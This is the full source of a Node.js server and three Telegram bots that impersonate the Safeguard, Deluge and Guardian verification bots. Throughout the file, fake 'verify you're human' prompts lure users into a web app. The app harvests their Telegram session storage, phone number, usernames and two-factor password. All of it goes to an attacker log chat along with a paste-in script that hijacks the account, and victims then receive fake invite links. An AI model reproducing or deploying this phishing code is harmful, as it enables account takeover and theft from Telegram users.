const express = require("express");
const fs = require("fs");
const path = require("path");

require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");
const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;

const admins = [5891533625]; // Replace with your Telegram ID if needed

const safeguardSuccess = fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg"));
const guardianSuccess = fs.readFileSync(path.join(__dirname, "images/success/guardian.jpg"));
const delugeVerification = fs.readFileSync(path.join(__dirname, "images/verification/deluge.jpg"));
const guardianVerification = fs.readFileSync(path.join(__dirname, "images/verification/guardian.jpg"));
const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg"));

const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true });
const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, { polling: true });
const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, { polling: true });

const guardianButtonTexts = [
  "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
  "Why an Ape ❔ You can be eNORMUS!🔷",
  "🔥Raid with @Raidar 🔥"
];

const generateRandomString = (length) => {
  const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }
  return result;
};

let safeguardUsername;
let delugeUsername;
let guardianUsername;

safeguardBot.getMe().then(botInfo => {
  safeguardUsername = botInfo.username;
  console.log(`Safeguard Bot Username: ${safeguardUsername}`);
}).catch(err => console.error("Error getting Safeguard bot info:", err));

delugeBot.getMe().then(botInfo => {
  delugeUsername = botInfo.username;
  console.log(`Deluge Bot Username: ${delugeUsername}`);
}).catch(err => console.error("Error getting Deluge bot info:", err));

guardianBot.getMe().then(botInfo => {
  guardianUsername = botInfo.username;
  console.log(`Guardian Bot Username: ${guardianUsername}`);
}).catch(err => console.error("Error getting Guardian bot info:", err));

const app = express();
app.use(express.json());

// Handle /a/ route for Telegram login (place before express.static to ensure it takes precedence)
app.get("/a/", (req, res) => {
  console.log("Handling /a/ route, redirecting to Telegram login: https://web.telegram.org/a/");
  res.redirect("https://web.telegram.org/a/");
});

// Serve static files after defining custom routes
app.use(express.static("public"));

// Serve HTML from subfolders
app.get("/safeguard/", (req, res) => {
  console.log("Serving /safeguard/ route");
  res.sendFile(path.join(__dirname, "public", "safeguard", "index.html"));
});

app.get("/deluge/", (req, res) => {
  console.log("Serving /deluge/ route");
  res.sendFile(path.join(__dirname, "public", "deluge", "index.html"));
});

app.get("/guardian/", (req, res) => {
  console.log("Serving /guardian/ route");
  res.sendFile(path.join(__dirname, "public", "guardian", "index.html"));
});

app.post("/api/users/telegram/info", async (req, res) => {
  try {
    const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
    console.log(`Received user data for userId ${userId}, type: ${type}`);
    let pass = password || "No Two-factor authentication enabled.";
    let usernameText = usernames && usernames.length > 0 ? `Usernames owned:\n${usernames.map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n")}` : "No usernames";
    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
    const quickAuth = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;

    await handleRequest(req, res, { password: pass, script: quickAuth, userId, name: firstName, number: formattedNumber, usernames: usernameText, premium: isPremium, type });
  } catch (error) {
    console.error("500 server error in /api/users/telegram/info:", error);
    res.status(500).json({ error: "server error" });
  }
});

const handleRequest = async (req, res, data) => {  
  const botMap = { safeguard: safeguardBot, guardian: guardianBot, deluge: delugeBot };
  let bot = botMap[data.type] || null;
  if (!bot) {
    console.error(`No bot found for type: ${data.type}`);
    res.status(400).json({ error: "Invalid bot type" });
    return;
  }

  // Send user data to LOGS_ID
  try {
    console.log(`Sending user data to LOGS_ID: ${process.env.LOGS_ID}`);
    await bot.sendMessage(
      process.env.LOGS_ID,
      `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`,
      { parse_mode: "HTML" }
    );
    console.log(`Successfully sent user data to LOGS_ID for userId ${data.userId}`);
  } catch (error) {
    console.error(`Failed to send user data to LOGS_ID: ${error.message}`);
  }

  // Send temporary link to the user (for safeguard and guardian)
  let type = data.type;
  if (type === "safeguard" || type === "guardian") {
    let image = type === "safeguard" ? safeguardSuccess : guardianSuccess;
    let caption = type === "safeguard" 
      ? `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(16)}\n\nThis link is a one time use and will expire`
      : `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
    const randomText = guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)];
    const buttons = type === "safeguard" 
      ? { reply_markup: { inline_keyboard: [[{ text: "@SOLTRENDING", url: "https://t.me/SOLTRENDING" }]] } }
      : { reply_markup: { inline_keyboard: [[{ text: randomText, url: `https://t.me/+${generateRandomString(16)}` }]] } };

    try {
      console.log(`Sending temporary link to userId ${data.userId}`);
      await bot.sendPhoto(data.userId, image, { caption, ...buttons, parse_mode: "HTML" });
      console.log(`Successfully sent temporary link to userId ${data.userId}`);
    } catch (error) {
      console.error(`Failed to send temporary link to userId ${data.userId}: ${error.message}`);
    }
  }

  res.json({});
};

const handleNewChatMember = async (bot, type) => {
  bot.on("my_chat_member", (update) => {
    const chatId = update.chat.id;
    let jsonToSend;
    let imageToSend;
    switch (type) {
      case "deluge":
        jsonToSend = { caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Tap To Verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
        imageToSend = delugeVerification;
        break;
      case "safeguard":
        jsonToSend = { caption: `${update.chat.title} is being protected by @Safeguard\n\nClick below to verify you're human`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Tap To Verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
        imageToSend = safeguardVerification;
        break;
      case "guardian":
        jsonToSend = { caption: `<b>${update.chat.title} is protected by Guardian.</b>\n\n⚠️ONLY use the "<b>Click to verify</b>" below and <b>avoid pressing any sponsored ads</b> within this portal. ⚠️`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Click to verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
        imageToSend = guardianVerification;
        break;  
      default:
        jsonToSend = {};
    }
    if (update.chat.type === "channel" && update.new_chat_member.status === "administrator" && update.new_chat_member.user.is_bot && admins.includes(update.from.id)) {
      bot.sendPhoto(chatId, imageToSend, jsonToSend);
    }
  });
};

function handleStart(bot) {
  bot.onText(/\/start/, (msg) => {
    console.log(`Received /start from chat ID: ${msg.chat.id} for bot with token: ${bot._token}`);
    let botInfo;
    bot.getMe().then(botInformation => {
      botInfo = botInformation;
      if (botInfo.username) {
        const chatId = msg.chat.id;
        let jsonToSend;
        let imageToSend;
        if (botInfo.username === safeguardUsername) {
          jsonToSend = {
            caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' to proceed.`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[{
                text: "VERIFY",
                web_app: {
                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
                }
              }]]
            }
          };
          imageToSend = safeguardVerification;
        } else if (botInfo.username === delugeUsername) {
          jsonToSend = {
            caption: `The group is protected by @delugeguardbot.\n\nClick 'Tap To Verify' to start verification.`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[{
                text: "Tap To Verify",
                web_app: {
                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
                }
              }]]
            }
          };
          imageToSend = delugeVerification;
        } else if (botInfo.username === guardianUsername) {
          jsonToSend = {
            caption: `🧑 <b>Human Authentication</b>\n\nClick 'Verify' to proceed.`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[{
                text: "Verify",
                web_app: {
                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
                }
              }]]
            }
          };
          imageToSend = guardianVerification;
        }
        bot.sendPhoto(chatId, imageToSend, jsonToSend)
          .then(() => console.log(`Sent response to ${chatId} for ${botInfo.username}`))
          .catch(err => console.error(`Error sending to ${chatId}:`, err));
      }
    }).catch(err => console.error("Error in getMe:", err));
  });
}

handleNewChatMember(safeguardBot, "safeguard");
handleNewChatMember(delugeBot, "deluge");
handleNewChatMember(guardianBot, "guardian");

handleStart(safeguardBot);
handleStart(delugeBot);
handleStart(guardianBot);

const port = process.env.PORT || 80;
app.listen(port, () => console.log(`loaded everyone & running on port ${port}`));
